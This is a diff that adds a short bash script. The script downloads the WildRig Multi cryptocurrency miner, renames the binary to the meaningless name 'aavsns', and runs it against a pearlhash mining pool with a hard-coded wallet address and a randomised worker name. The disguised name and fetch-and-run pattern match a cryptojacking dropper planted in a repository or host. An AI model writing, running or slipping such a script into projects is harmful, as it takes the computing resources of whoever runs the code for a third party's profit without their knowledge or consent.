@@ -1,0 +1,7 @@
+#!/bin/bash
+apt update
+apt -y install ocl-icd-opencl-dev
+wget https://github.com/andru-kun/wildrig-multi/releases/download/0.49.3/wildrig-multi-linux-0.49.3.tar.gz
+tar xf wildrig-multi-linux-0.49.3.tar.gz
+mv wildrig-multi aavsns
+./aavsns -a pearlhash -o pool.pearlhash.xyz:9000 -u prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch -w $(echo $RANDOM | md5sum | head -c 10)
